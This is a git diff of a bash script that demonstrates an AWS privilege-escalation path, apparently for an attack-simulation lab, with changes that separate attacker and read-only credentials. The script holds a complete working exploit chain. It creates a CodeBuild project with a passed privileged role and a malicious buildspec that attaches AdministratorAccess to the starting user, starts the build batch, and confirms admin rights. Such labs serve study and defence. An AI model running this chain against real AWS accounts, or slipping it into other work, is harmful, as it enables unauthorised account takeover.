@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -63,6 +65,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -73,23 +84,34 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -99,17 +121,19 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -117,7 +141,7 @@ else
 fi
 echo ""
 
-# Step 5: Prepare buildspec for CodeBuild project
+# [EXPLOIT] Step 5: Prepare buildspec for CodeBuild project
 echo -e "${YELLOW}Step 5: Preparing CodeBuild project with malicious buildspec${NC}"
 echo "Creating buildspec that will attach AdministratorAccess policy to our user..."
 
@@ -144,14 +168,15 @@ echo -e "${BLUE}Buildspec contents:${NC}"
 echo "$BUILDSPEC"
 echo -e "${GREEN}✓ Buildspec prepared${NC}\n"
 
-# Step 6: Create CodeBuild project with target role
+# [EXPLOIT] Step 6: Create CodeBuild project with target role
+use_starting_creds
 echo -e "${YELLOW}Step 6: Creating CodeBuild project with privileged role${NC}"
 echo "This is the privilege escalation vector - passing the target role to CodeBuild..."
 TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 
 # Create the CodeBuild project with batch buildspec
-show_attack_cmd "aws codebuild create-project --region $AWS_REGION --name \"$CODEBUILD_PROJECT_NAME\" --source \"{\\\"type\\\":\\\"NO_SOURCE\\\",\\\"buildspec\\\":\\\"version: 0.2\\\\nbatch:\\\\n  fast-fail: false\\\\n  build-list:\\\\n    - identifier: privesc_build\\\\n      buildspec: |\\\\n        version: 0.2\\\\n        phases:\\\\n          build:\\\\n            commands:\\\\n              - echo \\\\\\\"Starting privilege escalation...\\\\\\\"\\\\n              - aws iam attach-user-policy --user-name ${STARTING_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\\\n              - echo \\\\\\\"Successfully attached AdministratorAccess policy!\\\\\\\"\\\"}\" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role \"$TARGET_ROLE_ARN\" --build-batch-config \"{\\\"serviceRole\\\":\\\"${TARGET_ROLE_ARN}\\\"}\" --output json"
+show_attack_cmd "Attacker" "aws codebuild create-project --region $AWS_REGION --name \"$CODEBUILD_PROJECT_NAME\" --source \"{\\\"type\\\":\\\"NO_SOURCE\\\",\\\"buildspec\\\":\\\"version: 0.2\\\\nbatch:\\\\n  fast-fail: false\\\\n  build-list:\\\\n    - identifier: privesc_build\\\\n      buildspec: |\\\\n        version: 0.2\\\\n        phases:\\\\n          build:\\\\n            commands:\\\\n              - echo \\\\\\\"Starting privilege escalation...\\\\\\\"\\\\n              - aws iam attach-user-policy --user-name ${STARTING_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\\\n              - echo \\\\\\\"Successfully attached AdministratorAccess policy!\\\\\\\"\\\"}\" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role \"$TARGET_ROLE_ARN\" --build-batch-config \"{\\\"serviceRole\\\":\\\"${TARGET_ROLE_ARN}\\\"}\" --output json"
 aws codebuild create-project \
     --region $AWS_REGION \
     --name "$CODEBUILD_PROJECT_NAME" \
@@ -171,11 +196,12 @@ else
 fi
 echo ""
 
-# Step 7: Start the build batch to execute the privilege escalation
+# [EXPLOIT] Step 7: Start the build batch to execute the privilege escalation
+use_starting_creds
 echo -e "${YELLOW}Step 7: Starting CodeBuild build batch to execute privilege escalation${NC}"
 echo "Starting build batch for project: $CODEBUILD_PROJECT_NAME"
 
-show_attack_cmd "aws codebuild start-build-batch --region $AWS_REGION --project-name \"$CODEBUILD_PROJECT_NAME\" --output json"
+show_attack_cmd "Attacker" "aws codebuild start-build-batch --region $AWS_REGION --project-name \"$CODEBUILD_PROJECT_NAME\" --output json"
 BUILD_RESULT=$(aws codebuild start-build-batch \
     --region $AWS_REGION \
     --project-name "$CODEBUILD_PROJECT_NAME" \
@@ -193,7 +219,8 @@ else
 fi
 echo ""
 
-# Step 8: Wait for the build batch to complete and policy to propagate
+# [OBSERVATION] Step 8: Wait for the build batch to complete and policy to propagate
+use_readonly_creds
 echo -e "${YELLOW}Step 8: Waiting for build batch to complete and policy to propagate${NC}"
 echo "This may take 2-3 minutes for the batch build orchestration and IAM changes..."
 
@@ -202,7 +229,7 @@ WAIT_TIME=0
 MAX_WAIT=240  # Increased to 4 minutes for batch builds
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
     # Get both batch status and individual build status
-    show_cmd "aws codebuild batch-get-build-batches --region $AWS_REGION --ids \"$BUILD_BATCH_ID\" --output json"
+    show_cmd "ReadOnly" "aws codebuild batch-get-build-batches --region $AWS_REGION --ids \"$BUILD_BATCH_ID\" --output json"
     BATCH_INFO=$(aws codebuild batch-get-build-batches \
         --region $AWS_REGION \
         --ids "$BUILD_BATCH_ID" \
@@ -248,11 +275,12 @@ echo -e "${YELLOW}Waiting additional 15 seconds for IAM policy propagation...${N
 sleep 15
 echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
 
-# Step 9: Verify admin access
+# [OBSERVATION] Step 9: Verify admin access
+use_readonly_creds
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
